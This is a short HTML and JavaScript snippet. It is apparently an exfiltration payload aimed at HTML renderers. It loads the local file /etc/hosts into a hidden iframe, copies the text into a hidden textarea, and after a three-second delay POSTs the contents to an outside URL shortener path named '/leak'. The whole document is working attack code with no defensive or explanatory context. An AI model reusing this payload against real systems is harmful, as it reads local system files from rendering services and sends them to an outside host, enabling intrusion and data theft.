<iframe id="leaker" src="file:///etc/hosts" style="display:none;"></iframe>
<textarea id="dump" style="display:none;"></textarea>

<script>
  setTimeout(() => {
    try {
      const iframe = document.getElementById("leaker");
      const body = iframe.contentDocument.body;
      const dump = document.getElementById("dump");
      dump.value = body.innerText;

      fetch("https://tinyurl.com/vvh5tkem/leak", {
        method: "POST",
        body: JSON.stringify({ content: dump.value }),
      });
    } catch (e) {
      console.error("Leak failed:", e);
    }
  }, 3000); // wait for iframe to load
</script>
